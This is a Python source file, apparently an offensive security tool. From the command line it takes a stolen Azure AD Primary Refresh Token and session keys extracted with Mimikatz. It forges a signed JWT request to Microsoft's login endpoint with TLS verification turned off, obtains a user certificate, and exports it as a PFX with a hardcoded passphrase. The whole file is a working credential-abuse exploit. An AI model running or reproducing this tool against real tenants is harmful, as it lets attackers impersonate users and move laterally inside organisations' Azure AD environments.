# requirements
# PyOpenSSL
# python_jwt
# requests

import ast
import base64
import argparse

import OpenSSL.crypto
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from jwcrypto.common import base64url_encode, json_encode

def GenerateCsr(common_name):
    key = OpenSSL.crypto.PKey()
    key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)

    req = OpenSSL.crypto.X509Req()
    req.get_subject().CN = common_name

    req.set_pubkey(key)
    req.sign(key, 'sha256')

    private_key = OpenSSL.crypto.dump_privatekey(
        OpenSSL.crypto.FILETYPE_PEM, key)

    csr = OpenSSL.crypto.dump_certificate_request(
               OpenSSL.crypto.FILETYPE_PEM, req)

    return (private_key,
            csr.decode('utf-8').replace("-----BEGIN CERTIFICATE REQUEST-----", "").replace("-----END CERTIFICATE REQUEST-----", "").replace('\n',''))

def Sign(data, key):
    import hmac
    import hashlib
    return hmac.new(key, data, hashlib.sha256).hexdigest().encode("utf-8")

def CertToPem(x5c):
    return "-----BEGIN CERTIFICATE-----" + \
           "\n" + \
           ''.join([x + "\n" for x in [x5c[i:i+64] for i in range(0, len(x5c), 64)]]) + \
           "-----END CERTIFICATE-----"



def GetAzureADP2PCert(TenantId, Prt, UserName, HexCtx, HexDerivedKey):
    Ctx = bytes.fromhex(HexCtx)
    DerivedKey = bytes.fromhex(HexDerivedKey)

    PrivateKey, Csr = GenerateCsr(UserName)

    RefreshToken = base64.b64decode(Prt + "=" * ((4 - len(Prt) % 4) % 4)).decode('utf-8')

    Base64Ctx = base64.b64encode(Ctx).decode()

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    # open session
    sess = requests.session()

    # get the nonce from the server
    nonceRequest = sess.post('https://login.microsoftonline.com/{0}/oauth2/token'.format(TenantId), verify=False, data = {'grant_type': 'srv_challenge'})

    # extract the nonce from the response
    nonce = ast.literal_eval(nonceRequest.text)['Nonce']

    import python_jwt as jwt, jwcrypto.jwk as jwk, jwcrypto.jwe as jwe


    header = {
        'alg': 'HS256',
        'ctx': Base64Ctx
        }

    message = {
        'iss': 'aad:brokerplugin',
        'grant_type': 'refresh_token',
        'aud': 'login.microsoftonline.com',
        'request_nonce': nonce,
        'scope': 'openid aza ugs',
        'refresh_token' : RefreshToken,
        'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b' , # hardcoded
        'cert_token_use': 'user_cert',
        'csr_type': 'http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10',
        'csr': Csr
    }

    dataToSign = base64url_encode(json_encode(header)) + '.' + base64url_encode(json_encode(message))

    signature =  base64url_encode(bytes.fromhex(Sign(dataToSign.encode(), DerivedKey).decode())) 

    token = dataToSign + '.' + signature

    certRequest = sess.post('https://login.microsoftonline.com/{0}/oauth2/token'.format(TenantId), verify=False, data = {'grant_type': "urn:ietf:params:oauth:grant-type:jwt-bearer",
                                                                                                                                           'request': token.encode('ascii')})
    x5c = ast.literal_eval(certRequest.text)['x5c']
    pemCert = CertToPem(x5c)

    with open(UserName + '.cer', 'w') as f:
        f.write(pemCert)
        
    pkcs = OpenSSL.crypto.PKCS12()
    pkcs.set_privatekey(OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, PrivateKey))
    pkcs.set_certificate(OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, pemCert))
    with open(UserName + '.pfx', 'wb') as file:
        file.write(pkcs.export(passphrase='mor'.encode()))

    print("Done")
    print("PFX saved with the name {0}.pfx".format(UserName))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Request P2P cert from Azure for Azure AD joined machines authentication.')
    parser.add_argument('--tenantId',  help='Tenant ID of the Azure AD account.', required=True)
    parser.add_argument('--prt',  help='Primary Refresh Token of the Azure AD account.', required=True)
    parser.add_argument('--userName', help='Full name of Azure AD account (in the format USER@ORG).', required=True)
    parser.add_argument('--hexCtx', help='Contex hex from Mimikatz dpapi::cloudapkd.', required=True)
    parser.add_argument('--hexDerivedKey',  help='Derived Key hex from Mimikatz dpapi::cloudapkd.', required=True)

    args = parser.parse_args()

    GetAzureADP2PCert(args.tenantId, args.prt, args.userName, args.hexCtx, args.hexDerivedKey)
